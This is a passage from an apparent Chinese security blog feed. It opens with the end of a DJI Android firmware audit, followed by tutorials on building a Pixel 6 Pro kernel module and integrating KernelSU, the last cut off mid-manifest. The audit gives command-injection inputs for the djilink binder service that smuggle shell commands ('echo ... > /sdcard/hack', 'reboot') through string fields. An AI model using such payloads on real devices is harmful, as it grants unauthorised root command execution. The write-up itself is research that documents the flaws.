src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240401111300718.png"><br>函数表<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240401223553638.png"></p><p><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240401212204625.png"><br>so 文件都是32位了，之前用IDA64打开，可以识别出函数符号，但是没有办法生成伪代码。<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240401232850209.png"></p><p>可以看到这里会调用parcel 构造binder 的数据包，根据write函数的调用，可以知道会写入四个int32 类型的数值，然偶再写入一个string16 的值，调用的 service 服务是1030 。<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240401232814384.png"><br>为了方便触发 djilink 提供的service ，可以使用 “service call djilink 1030 i32 1 i32 1 i32 1 i32 1 s16 “;echo hhhh &gt; &#x2F;sdcard&#x2F;hack ;” “ 来触发。</p><h3 id="ti-audio-setTiAudioStatus"><a href="#ti-audio-setTiAudioStatus" class="headerlink" title="ti_audio &amp; setTiAudioStatus"></a>ti_audio &amp; setTiAudioStatus</h3><p>在进行审计的过程中，还发现了其中的ti_audio 也存在同样的问题，在如下的sub_1B52C() 函数中，有关ti_audio 的作用猜测是TI 音频操作命令。<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240401112119302.png"><br>同样的，在sub_4AA6C() 可以看到 setTiAudioStatus的方法<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240401112108496.png"><br>这个setTiAudioStatus方法会在 libdijilink.so 中定义传参的方法，可以看到传入了一个int32 的值，和两个string16 的值。而这两个string16 对应的是 ti_audio 需要的两个字符串。<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240402231750077.png"><br>可以使用 “ service call djilink 1031 i32 1 s16 “; reboot ;” s16 “; reboot ;” “ 来触发root命令。</p><h3 id="start-active-request-auth"><a href="#start-active-request-auth" class="headerlink" title="start_active_request_auth"></a>start_active_request_auth</h3><p>在 sub_1B90C()函数中 存在堆栈溢出的漏洞，其中可以看到v5的值是可以是由外来输入字符决定的，另一方面 v22 局部变量会被分配到 48字节的内存。</p><p>在这里虽然使用了 strlen_chk 函数来对溢出的问题来处理，但是 -1LL 表示的是对 a1 字符串的长度检查被禁用了，这是显式地告诉编译器不要对 a1 的长度进行限制检查。<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240401141523633.png"></p><h3 id="DM368Cmd"><a href="#DM368Cmd" class="headerlink" title="DM368Cmd"></a>DM368Cmd</h3><p>再这个功能中，可以注意到这是一个工厂测试，同样也存在执行命令问题。<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240401151332603.png"></p><p>在sub_34A88()函数中，会创建一个线程调用sub_34A44 函数<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240401151813755.png"></p><p>参考： <a href="https://icanhack.nl/blog/dji-rm500-privilege-escalation/">https://icanhack.nl/blog/dji-rm500-privilege-escalation/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pixel 6Pro Android驱动模块编译</title>
    <link href="/2024/03/28/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91/"/>
    <url>/2024/03/28/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="Android-驱动编译背景"><a href="#Android-驱动编译背景" class="headerlink" title="Android 驱动编译背景"></a>Android 驱动编译背景</h2><p>Android 内核驱动是Android中负责硬件的连接和操控，确保硬件与操作系统的交互，这些驱动是内核的拓展组件，通过提供统一的驱动操作接口供用户层使用。</p><p>Android内核驱动主要分为两种类型：Android专用驱动和Android使用的设备驱动（基于Linux）。其中，Android专用驱动包括如Ashmem（匿名共享内存驱动）、Logger（轻量级的日志驱动）、Binder驱动（基于OpenBinder驱动，为Android平台提供IPC进程间通信的支持）等。而设备驱动则主要基于Linux的设备驱动模型，负责管理各种硬件设备，如USB驱动、物理内存驱动等。</p><p>在Android系统中，一个传统的驱动架构通常包括kernel驱动、HAL（硬件抽象层）驱动、JNI（Java Native Interface）层、service层等。程序运行时的调用关系通常是从apk（应用程序包）开始，通过service层、JNI层、HAL层，最终到达kernel驱动层。</p><p>在开发 Android 驱动程序的过程中，如何对开发好的驱动程序进行编译。 </p><p>对于Linux驱动有两种编译和运行方式：</p><ul><li>将驱动编译进Linux 内核中，当Linux 内核启动的时候就会自动运行驱动程序。</li><li>将驱动编译成模块（Linux 中模块拓展名为.ko）， 在 Linux 内核启动以后使用相应命令加载驱动模块。<ul><li>内核模块是Linux 内核向外部提供的一个插口</li><li>内核模块是具有独立功能的程序，可以被单独编译，但不能单独运行，在运行时被链接到内核作为内核一部分在内核空间运行。</li><li>内核模块便于 驱动和文件系统的二次开发</li></ul></li></ul><p>所以想要驱动在Android 系统中运行，有两种编译方式：</p><ul><li>驱动编译到内核源码树中，直接编译到内核中。</li><li>驱动编译到内核模块，或者随着内核源码树一起编译成ko 文件。</li></ul><p>这里将介绍如何把字符设备驱动源程序在内核源码中编译成 .ko 文件，然后加载到pixel 6P 中。主要分为两部分</p><ul><li>第一步：将字符设备驱动源代码放到内核 &#x2F;common&#x2F;driver&#x2F;char&#x2F; 目录中</li><li>第二步：编辑Kconfig 和 Makefile 文件，Kconfig 文件 是在编译前执行配置命令 make menuconfi 时用到的；Makefile 在执行编译命令make 用到的。</li></ul><h2 id="驱动源码"><a href="#驱动源码" class="headerlink" title="驱动源码"></a>驱动源码</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs arduino">android_hello.c<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/cdev.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> major = <span class="hljs-number">300</span>;  # 主设备号<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> minor = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">dev_t</span> devno;<br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">cdev</span> cdev;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">hello_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *filep)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;hello open\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span> hello_ops=<br>&#123;<br>    .open = hello_open,<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">hello_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;hello_init\n&quot;</span>);<br>    <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;ohhhhhhhhh HelloWorld driver!&quot;</span>);<br>    devno = <span class="hljs-built_in">MKDEV</span>(major, minor);  # 定义设备号宏<br>    ret = <span class="hljs-built_in">register_chrdev_region</span>(devno, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;HelloWorld&quot;</span>); 注册字符设备<br>    <span class="hljs-keyword">if</span>(ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;register_chrdev_region faile\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-built_in">cdev_init</span>(&amp;cdev, &amp;hello_ops);<br>    ret = <span class="hljs-built_in">cdev_add</span>(&amp;cdev, devno, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;cdev_add faile \n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">hello_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">cdev_del</span>(&amp;cdev);<br>    <span class="hljs-built_in">unregister_chrdev_region</span>(devno, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;hello_exit\n&quot;</span>);<br>&#125;<br><span class="hljs-built_in">MODULE_LICENSE</span>(<span class="hljs-string">&quot;GPL&quot;</span>);<br><span class="hljs-built_in">module_init</span>(hello_init);<br><span class="hljs-built_in">module_exit</span>(hello_exit);<br></code></pre></td></tr></table></figure><h2 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h2><p>这里我下载的是common-android13-5.10的通用内核源码，这里在编译驱动之前要将这个common-android13-5.10 先编译出来，然后将boot.img 刷入到pixel6P 中，避免内核版本不一致，导致后面编译出来的驱动加载不起来，另外，单独对 pixel 6P  boot 分区刷编译的内核镜像要注意的是，编译出来的内核镜像版本不能低于pixel 6P 原来的内核版本，否则会成砖，要重新刷入工厂镜像。</p><p>因为我测试过common-android13-5.10编译出来的boot.img 刷到pixel6P中，然后驱动可以执行，但是再pixel 5 中，都是aarch64 架构的，就无法加载了，显示ELF格式错误。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts">Pixel <span class="hljs-number">5</span><br><span class="hljs-symbol">redfin:</span><span class="hljs-keyword">/data/</span>local/tmp <span class="hljs-meta"># insmod android_hello.ko</span><br><span class="hljs-symbol">insmod:</span> failed to load android_hello.ko: Exec format error<br><span class="hljs-number">1</span>|redfin:<span class="hljs-keyword">/data/</span>local/tmp <span class="hljs-meta"># file android_hello.ko</span><br>android_hello.ko: ELF relocatable, <span class="hljs-number">64</span>-bit LSB arm64, static, BuildID=<span class="hljs-number">5</span>d50bec4bbc8b8d26924f0630567fb9a4b0e347c, not stripped<br><span class="hljs-symbol">redfin:</span><span class="hljs-keyword">/data/</span>local/tmp <span class="hljs-meta"># uname -a</span><br>Linux localhost <span class="hljs-number">4.19</span><span class="hljs-number">.252</span>-g005154455a52-ab9276409 <span class="hljs-meta">#1 SMP PREEMPT Wed Nov 9 11:59:07 UTC 2022 aarch64 Toybox</span><br><span class="hljs-symbol">redfin:</span><span class="hljs-keyword">/data/</span>local/tmp <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>在pixel6P中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">raven</span>:/data/local/tmp # file android_hello.ko<br><span class="hljs-attribute">android_hello</span>.ko: ELF relocatable, <span class="hljs-number">64</span>-bit LSB arm64, static, BuildID=<span class="hljs-number">5</span>d50bec4bbc8b8d26924f0630567fb9a4b0e347c, not stripped<br><span class="hljs-attribute">raven</span>:/data/local/tmp # insmod android_hello.ko<br><span class="hljs-attribute">insmod</span>: failed to load android_hello.ko: File exists<br><span class="hljs-attribute">1</span>|raven:/data/local/tmp # uname -a<br><span class="hljs-attribute">Linux</span> localhost <span class="hljs-number">5</span>.<span class="hljs-number">10</span>.<span class="hljs-number">205</span>-android13-<span class="hljs-number">4</span>-<span class="hljs-number">00002</span>-g6bc28fdfeec3-dirty #<span class="hljs-number">1</span> SMP PREEMPT Tue Mar <span class="hljs-number">12</span> <span class="hljs-number">21</span>:<span class="hljs-number">27</span>:<span class="hljs-number">16</span> UTC <span class="hljs-number">2024</span> aarch64 Toybox<br></code></pre></td></tr></table></figure><p>排除内核源码版本的问题后，将代码放到对应的 内核源码目录内，<br><img src="/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91.assets/image-20240328225123329.png"><br>然后在 &#x2F;drivers&#x2F;char&#x2F;Kconfig 中添加配置。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Kconfig<br>config ANDROID_HELLO<br>        tristate <span class="hljs-string">&quot;MY testAndroid_hello&quot;</span><br>        <span class="hljs-keyword">default</span> y<br>        help<br>          qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq<br>endmenu<br></code></pre></td></tr></table></figure><p>如果驱动程序单独放在一个文件夹内，那么要在该文件夹内单独编写Kconfig, 然后在上一级目录的Kconfig中加入Kconfig 的路径，便于menuconfig 找得到你的Kconfig。<br>类似于如下所示<br><img src="/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91.assets/image-20240328230419169.png"><br>然后在&#x2F;drivers&#x2F;char&#x2F;Makefile 中添加你要编译的对象。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Makefile<br>obj-m     += android_hello.o<br>或者obj-$(CONFIG_ANDROID_HELLO) += android_hello.o<br></code></pre></td></tr></table></figure><p>然后执行在 &#x2F;common-android13-5.10&#x2F;common 中执行 make menuconfig 命令，</p><p>修改 “MY testAndroid_hello” 为 M ， 因为 M 表示程序会自动到你所指定的dir目录中查找模块源码，将其编译，生成KO 文件，Y 表示直接编译内核。</p><p>在char driver 中可以看到我们定义的内核模块<br><img src="/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91.assets/image-20240328152015762.png"></p><p>然后 &#x2F;common-android13-5.10&#x2F; 下执行</p><blockquote><p>BUILD_CONFIG&#x3D;common&#x2F;build.config.gki.aarch64 build&#x2F;build.sh<br>开始编译</p></blockquote><p>可以看到 交叉编译链 将 android_hello.o 编译为 module。<br><img src="/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91.assets/image-20240328160316362.png"></p><p>编译到这一块会中断，显示如下的 “ERROR: modules list out of data”<br><img src="/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91.assets/image-20240328162521161.png"></p><p>虽然中断了，但不影响ko编译出来<br><img src="/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91.assets/image-20240328163114575.png"></p><p>如果想解决整个ERROR, 在build.sh 文件中可以看到整个判断<br><img src="/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91.assets/image-20240328162559303.png"><br>可以删除“exit 1”，或者只需要</p><blockquote><p>cp &#x2F;root&#x2F;aosp&#x2F;common-android13-5.10&#x2F;out&#x2F;android13-5.10&#x2F;common&#x2F;modules.order common&#x2F;android&#x2F;gki_aarch64_modules<br>再次编译就可以成功通过编译了。</p></blockquote><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gams">部分编译<span class="hljs-built_in">log</span><br>+ <span class="hljs-keyword">set</span> +x<br>========================================================<br> Checking <span class="hljs-comment">the list of modules:</span><br>========================================================<br> Comparing <span class="hljs-comment">the KMI and the symbol lists:</span><br>+ gki_modules_list=/root/aosp/common-android13<span class="hljs-number">-5.10</span>/common/android/gki_system_dlkm_modules<br>++ sed <span class="hljs-comment">&#x27;s/\.ko$//&#x27;</span> /root/<span class="hljs-comment">aosp</span>/common-android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">common</span>/android/<span class="hljs-comment">gki_system_dlkm_modules</span><br>++ tr <span class="hljs-comment">&#x27;\n&#x27;</span> <span class="hljs-comment">&#x27; &#x27;</span><br>+ KMI_STRICT_MODE_OBJECTS=<span class="hljs-string">&#x27;vmlinux &#x27;</span><br>+ /root/aosp/common-android13<span class="hljs-number">-5.10</span>/build/abi/compare_to_symbol_list /root/<span class="hljs-comment">aosp</span>/common-android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">out</span>/android13<span class="hljs-number">-5.10</span>/<span class="hljs-comment">common</span>/Module.symvers /<span class="hljs-comment">root</span>/aosp/<span class="hljs-comment">common-android13-5.10</span>/out/<span class="hljs-comment">android13-5.10</span>/common/<span class="hljs-comment">abi_symbollist.raw</span><br>+ <span class="hljs-keyword">set</span> <span class="hljs-comment">+x</span><br>========================================================<br> Installing <span class="hljs-comment">kernel modules into staging directory</span><br>  INSTALL <span class="hljs-comment">drivers</span>/char/<span class="hljs-comment">android_hello.ko   #</span> 编译出来的驱动<br>  DEPMOD  <span class="hljs-comment">5.10.205-android13-4-00002-g6bc28fdfeec3-dirty</span><br>========================================================<br> Generating <span class="hljs-comment">gki_certification_tools.tar.gz</span><br>========================================================<br> Generating <span class="hljs-comment">test_mappings.zip</span><br>========================================================<br></code></pre></td></tr></table></figure><p>adb push 到手机上<br><img src="/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91.assets/image-20240328164048154.png"></p><p>cat &#x2F;proc&#x2F;devices 查看<br><img src="/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91.assets/image-20240328164425527.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>编译驱动多看看Android 内核源码中驱动编译的流程，这里我没有刷面具，而是直接在编译内核镜像的时候，把KernelSU 编译到内核中，这样可以不用单独刷面具拿root。后面有时间再用交叉编译链来单独编译android 能用的ko 驱动模块。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pixel 6Pro Kernel编译整合KernelSU</title>
    <link href="/2024/02/29/19__KernelSU%E6%90%9E%E6%9C%BA/"/>
    <url>/2024/02/29/19__KernelSU%E6%90%9E%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><h3 id="什么是KernelSU"><a href="#什么是KernelSU" class="headerlink" title="什么是KernelSU"></a>什么是KernelSU</h3><p>来源:  <a href="https://kernelsu.org/zh_CN/guide/what-is-kernelsu.html">https://kernelsu.org/zh_CN/guide/what-is-kernelsu.html</a></p><p>KernelSU 的主要特点是它是<strong>基于内核的</strong>。 KernelSU 运行在内核空间， 所以它可以提供我们以前从未有过的内核接口。 例如，我们可以在内核模式下为任何进程添加硬件断点；我们可以在任何进程的物理内存中访问，而无人知晓；我们可以在内核空间拦截任何系统调用; 等等。</p><p>KernelSU 还提供了一个基于 overlayfs 的模块系统，允许您加载自定义插件到系统中。它还提供了一种修改 &#x2F;system 分区中文件的机制。</p><h3 id="判断是否支持"><a href="#判断是否支持" class="headerlink" title="判断是否支持"></a>判断是否支持</h3><p>下载对应的KernelSu<br><a href="https://github.com/tiann/KernelSU/releases">https://github.com/tiann/KernelSU/releases</a></p><p>安装KernelSu apk<br><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240103102521588.png"><br>查看设备是否支持，显示”未安装“，表示当前机器支持 KernelSU<br><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240104151452108.png"></p><p>查看设备内核版本，从设备的内核版本来看，设备的KMI ( <a href="7__Android%E6%9D%82%E9%A1%B9.md">7__Android杂项</a>)版本是  5.10-android13-4，相同的KMI的内核版本是兼容的, 在uname -a 查看的信息跟kernelSU里的不一致，不理解为啥会这样。</p><blockquote><p>raven:&#x2F; $ uname -a<br>Linux localhost 5.10.107-android13-4-00020-g02b5dfab573c-ab9358130 #1 SMP PREEMPT Thu Dec 1 18:28:18 UTC 2022 aarch64 Toybox<br><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240115150627360.png"></p></blockquote><p>commitID :  02b5dfab573c</p><h3 id="选择GKI版本"><a href="#选择GKI版本" class="headerlink" title="选择GKI版本"></a>选择GKI版本</h3><p><a href="https://source.android.com/docs/core/architecture/kernel/gki-android13-5_10-release-builds?hl=zh-cn">https://source.android.com/docs/core/architecture/kernel/gki-android13-5_10-release-builds?hl=zh-cn</a></p><p><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240103152118562.png"></p><p>下载boot-5.10-lz4.img，然后用010 查看，可以看到对应的内核版本，跟我们的系统版本是一致的。</p><p><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240103151931253.png"></p><h3 id="找到manifest-xxx-xml"><a href="#找到manifest-xxx-xml" class="headerlink" title="找到manifest_xxx.xml"></a>找到manifest_xxx.xml</h3><p>然后点击对应的kernel，可以看到对应GKI 构建的目录。</p><p><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240103170927977.png"></p><p>往下找，找到对应的manifest_xxx.xml，并下载。<br><img src="/19__KernelSU%E6%90%9E%E6%9C%BA.assets/image-20240103152506512.png"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;manifest&gt;<br>&lt;remote name<span class="hljs-operator">=</span><span class="hljs-string">&quot;aosp&quot;</span> fetch<span class="hljs-operator">=</span><span class="hljs-string">&quot;https://android.googlesource.com/&quot;</span> review<span class="hljs-operator">=</span><span class="hljs-string">&quot;https://android.googlesource.com/&quot;</span>/&gt;<br>&lt;default upstream<span class="hljs-operator">=</span><span class="hljs-string">&quot;master-kernel-build-2022&quot;</span> dest-branch<span class="hljs-operator">=</span><span class="hljs-string">&quot;master-kernel-build-2022&quot;</span> remote<span class="hljs-operator">=</span><span class="hljs-string">&quot;aosp&quot;</span> sync-j<span class="hljs-operator">=</span><span class="hljs-string">&quot;4&quot;</span>/&gt;<br>&lt;superproject name<span class="hljs-operator">=</span><span class="hljs-string">&quot;kernel/superproject&quot;</span> remote<span class="hljs-operator">=</span><span class="hljs-string">&quot;aosp&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;common-android13-5.10-2022-10&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/kernel&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;kernel/build&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;28bec492db207f403d08d88886f86dd1e2984089&quot;</span>&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;tools/bazel&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;kleaf/bazel.sh&quot;</span>/&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;WORKSPACE&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;kleaf/bazel.WORKSPACE&quot;</span>/&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/build.sh&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;build.sh&quot;</span>/&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/build_abi.sh&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;build_abi.sh&quot;</span>/&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/build_test.sh&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;build_test.sh&quot;</span>/&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/build_utils.sh&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;build_utils.sh&quot;</span>/&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/config.sh&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;config.sh&quot;</span>/&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/envsetup.sh&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;envsetup.sh&quot;</span>/&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/_setup_env.sh&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;_setup_env.sh&quot;</span>/&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/multi-switcher.sh&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;multi-switcher.sh&quot;</span>/&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/abi&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;abi&quot;</span>/&gt;<br>&lt;linkfile dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;build/static_analysis&quot;</span> src<span class="hljs-operator">=</span><span class="hljs-string">&quot;static_analysis&quot;</span>/&gt;<br>&lt;/project&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;hikey-modules&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;kernel/hikey-modules&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;8864304543d16b95c9c268e4e156601ef9b499e7&quot;</span> upstream<span class="hljs-operator">=</span><span class="hljs-string">&quot;android13-5.10&quot;</span> dest-branch<span class="hljs-operator">=</span><span class="hljs-string">&quot;android13-5.10&quot;</span>/&gt;<br>&lt;project path<span class="hljs-operator">=</span><span class="hljs-string">&quot;common&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;kernel/common&quot;</span> revision<span class="hljs-operator">=</span><span class="hljs-string">&quot;19424168db55715a7ba3f00505ac9b9f19fd3705&quot;</span> upstream<span class="hljs-operator">=</span><span class="hljs-string">&quot;android13-5.10-2022-10&quot;</span> dest-branch<span 